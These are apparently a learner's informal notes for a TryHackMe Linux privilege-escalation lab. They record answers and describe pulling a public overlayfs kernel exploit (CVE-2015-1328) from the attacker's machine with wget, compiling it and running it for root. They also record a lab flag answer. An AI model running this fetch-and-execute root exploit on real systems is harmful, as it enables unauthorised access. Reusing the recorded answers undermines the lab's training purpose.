
tryHackme:
<https://tryhackme.com/room/linprivesc>
#  Answer the questions below
What is the hostname of the target system?
wade7363-hostname

What is the Linux kernel version of the target system?

3.13.0-24-generic
cat /proc/version

What Linux is this?

ubuntu 14.04 LTS
/etc/issue

What version of the Python language is installed on the system?
python --version

2.7.6
What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)

CVE-2015-1328
<https://nvd.nist.gov/vuln/detail/CVE-2015-1328>
google search: 3.13.0-24-generic cve
1st result

# Task 4

Answer the questions below
find and use the appropriate kernel exploit to gain root privileges on the target system.
No answer needed-
Answer the questions below
find and use the appropriate kernel exploit to gain root privileges on the target system.-

Steps:
I used my kali machine. firstly connected to the vpn and then ssh to attack machine.
how?
- to get vpn file..go to tryhackme-click on top righthand side icon(an image)- access. There u will find vpn file.
- To access it on kali, put it on shared folder on windows c:/githubciscopackettracer/sharedmitu1
- open shared folder in kali and copy the path to vpn
- create a new vpn in kali- go to + vpn and then last option(saved vpn) and save it here.
- open the vpn from top right side
-  now we have to get the exploit file on kali. My foxfire was not loading..so I used windows.
- - search for the same kernel  exploit cve on google and download it.
- - put it in the same shared folder and access it on kali

- To download the exploit on the target:
- - first ssh it: ssh@ip of the attck amchine(given by tryhackme) karen
- - give the pwd too
- - go to next command terminal in kali and start http server:
- go to shared folder where file is - and then run http server
python3 -m http.server(by default it starts on 8000 port)
-- open 1 more terminal go to temp folder and get  that file by: wget  <my machine ip> :8000/<filename>(37292.c)
eg: wget 10.18.24.126:8000/37292.c
- now u get the exploit on target machine.
- need to compile and run it
- gcc 37292.c -o ofc(new file name)
- chmod +x ofc
- now run it: ./ofc
- done
- check whoami- u will get root
- 




What is the content of the flag1.txt file?

Answer format: THM-28392872729920
Command:
- once u get access to root, find the file flag1.txt
find / -type f -name flag1.txt
- Ans: /home/matt/flag1.txt
- cat it 


# Task 6

ref: <https://www.youtube.com/watch?v=7WQndt-1WzE&t=123s>

Answer the questions below
How many programs can the user "karen" run on the target system with sudo rights?
3
What is the content of the flag2.txt file?

THM-402028394

process:


How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

Answer format: **** **** *************
What is the hash of frank's password?

Answer format: ****.************************************************.*****/*******************.**************************


# Task7
